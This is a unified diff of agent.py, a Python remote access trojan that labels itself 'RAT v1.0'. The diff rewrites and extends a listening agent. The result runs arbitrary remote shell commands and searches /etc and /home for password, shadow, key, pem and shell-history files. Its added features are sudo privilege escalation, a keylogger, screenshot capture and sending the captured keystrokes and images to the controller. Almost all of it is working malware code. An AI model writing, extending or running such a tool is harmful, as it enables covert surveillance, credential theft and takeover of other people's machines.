@@ -1,112 +1,118 @@
-# agent.py
-import socket
-import subprocess
-import threading
-import os
-import sys
+#!/usr/bin/env python3
+import socket, ssl, subprocess, threading, os, sys, time
+from pynput import keyboard
+import pyautogui
 
-HOST = '0.0.0.0'   # Listen on all interfaces
-PORT = 5555        # Use the same port in controller.py
+# Configuration
+HOST, PORT = "0.0.0.0", 5555
+SECRET = "your_shared_secret"  # change before use
+LOGDIR = "logs"
+SEARCH_DIRS = ["/etc", "/home"]
+KEYWORDS = ["passwd","shadow",".conf",".key",".pem",".bash_history"]
+KEYLOG_FILE = None
+keylogger = None
 
-# Define the packages we'll need later (for screenshot, keylogger, etc.)
-REQUIRED_PACKAGES = ['pynput', 'pyautogui', 'Pillow']
+# Ensure log dir exists
+os.makedirs(LOGDIR, exist_ok=True)
 
-def install_missing_packages():
-    """
-    Automatically install required packages using pip.
-    This runs only once at startup.
-    """
-    try:
-        for package in REQUIRED_PACKAGES:
-            try:
-                __import__(package)
-            except ImportError:
-                print(f"[!] Installing missing package: {package}")
-                subprocess.call([sys.executable, "-m", "pip", "install", package])
-    except Exception as e:
-        print(f"[!] Package installation error: {e}")
+# Privilege escalation
+def escalate_privileges():
+    if os.geteuid() != 0:
+        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
 
-def execute_shell_command(cmd):
-    """
-    Executes a shell command and returns its output.
-    """
-    try:
-        result = subprocess.getoutput(cmd)
-        return result
-    except Exception as e:
-        return f"[ERROR executing command]: {e}"
+# Core functions
+def execute(cmd):
+    return subprocess.getoutput(cmd)
 
 def search_files():
-    """
-    Recursively searches for sensitive files across common directories.
-    Returns a formatted string with found file paths.
-    """
-    search_dirs = ['/etc', '/home']
-    keywords = ['passwd', 'shadow', '.conf', '.key', '.pem', '.bash_history', '.docx', '.pdf', '.txt']
     matches = []
+    for d in SEARCH_DIRS:
+        for root, _, files in os.walk(d):
+            for f in files:
+                if any(k in f.lower() for k in KEYWORDS):
+                    matches.append(os.path.join(root, f))
+    return "\n".join(matches) or "[*] No matches."
 
+def memory_info():
+    mem = open("/proc/meminfo").readlines()[:10]
+    procs = execute("ps aux --sort=-%mem | head -n6")
+    return "--- Mem ---\n" + "".join(mem) + "\n--- Top Procs ---\n" + procs
+
+# Keylogger callbacks
+def on_press(key):
+    global KEYLOG_FILE
     try:
-        for dir_path in search_dirs:
-            for root, dirs, files in os.walk(dir_path):
-                for file in files:
-                    for keyword in keywords:
-                        if keyword in file.lower():
-                            full_path = os.path.join(root, file)
-                            matches.append(full_path)
-        if matches:
-            return "\n".join(matches)
-        else:
-            return "[*] No matching files found."
-    except Exception as e:
-        return f"[ERROR during file search]: {e}"
+        KEYLOG_FILE.write(f"{key.char}")
+    except AttributeError:
+        KEYLOG_FILE.write(f"[{key.name}]")
 
-def handle_command(cmd):
-    """
-    Routes commands to the correct function.
-    """
+# Command handler
+def handle_cmd(cmd, conn):
     cmd = cmd.strip().lower()
+    # Built-ins
+    if cmd == "search": return search_files().encode()
+    if cmd == "mem":    return memory_info().encode()
+    if cmd == "start_keylogger":
+        global keylogger, KEYLOG_FILE
+        fname = f"{LOGDIR}/keylog_{int(time.time())}.txt"
+        KEYLOG_FILE = open(fname, "w+")
+        keylogger = keyboard.Listener(on_press=on_press)
+        keylogger.start()
+        return f"[*] Keylogger started: {fname}".encode()
+    if cmd == "stop_keylogger":
+        keylogger.stop()
+        KEYLOG_FILE.close()
+        return b"[*] Keylogger stopped."
+    if cmd == "get_keylog":
+        fname = KEYLOG_FILE.name if KEYLOG_FILE else None
+        if not fname or not os.path.exists(fname):
+            return b"[!] No keylog available."
+        data = open(fname, "rb").read()
+        header = f"FILE:{os.path.basename(fname)}:{len(data)}\n".encode()
+        return header + data
+    if cmd == "screenshot":
+        fname = f"{LOGDIR}/screen_{int(time.time())}.png"
+        img = pyautogui.screenshot()
+        img.save(fname)
+        data = open(fname, "rb").read()
+        header = f"FILE:{os.path.basename(fname)}:{len(data)}\n".encode()
+        return header + data
+    # Default: shell
+    return execute(cmd).encode()
 
-    if cmd == "search files":
-        return search_files()
+# Client thread
+def client_thread(conn, addr):
+    # SSL wrapping placeholder (if using certs)
+    # conn = ssl.wrap_socket(conn, server_side=True, keyfile="certs/server.key", certfile="certs/server.crt")
 
-    else:
-        return execute_shell_command(cmd)
+    # Authentication
+    conn.sendall(b"Password: ")
+    pwd = conn.recv(1024).decode().strip()
+    if pwd != SECRET:
+        conn.sendall(b"[!] Auth failed.\n")
+        conn.close(); return
 
-def handle_client(client_socket):
-    client_socket.send(b"[*] Connected to RAT agent.\nAvailable commands:\n- search files\n- any shell command (ls, whoami, etc)\n- exit\n")
+    # Banner
+    conn.sendall(b"[*] RAT v1.0 connected.\nCommands: search, mem, start_keylogger, stop_keylogger, get_keylog, screenshot, exit, [shell]\n")
 
     while True:
-        try:
-            client_socket.send(b"\nShell> ")
-            cmd = client_socket.recv(4096).decode()
+        conn.sendall(b"RAT> ")
+        raw = conn.recv(4096)
+        if not raw: break
+        cmd = raw.decode().strip()
+        if cmd == "exit": break
+        resp = handle_cmd(cmd, conn)
+        conn.sendall(resp)
+    conn.close()
 
-            if not cmd:
-                continue
-            if cmd.strip().lower() == "exit":
-                break
-
-            result = handle_command(cmd)
-            client_socket.send(result.encode())
-        except Exception as e:
-            error_msg = f"[Exception] {e}"
-            client_socket.send(error_msg.encode())
-            break
-
-    client_socket.close()
-
-def main():
-    install_missing_packages()
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((HOST, PORT))
-    server.listen(1)
-    print(f"[+] Listening on {HOST}:{PORT}...")
-
+# Main
+if __name__=="__main__":
+    escalate_privileges()
+    s = socket.socket()
+    s.bind((HOST, PORT))
+    s.listen(1)
+    print(f"[+] Agent listening on {HOST}:{PORT}")
     while True:
-        client_sock, addr = server.accept()
-        print(f"[+] Connection from {addr[0]}:{addr[1]}")
-        client_thread = threading.Thread(target=handle_client, args=(client_sock,))
-        client_thread.start()
-
-if __name__ == "__main__":
-    main()
+        c, a = s.accept()
+        print(f"[+] Connection from {a}")
+        threading.Thread(target=client_thread, args=(c, a)).start()
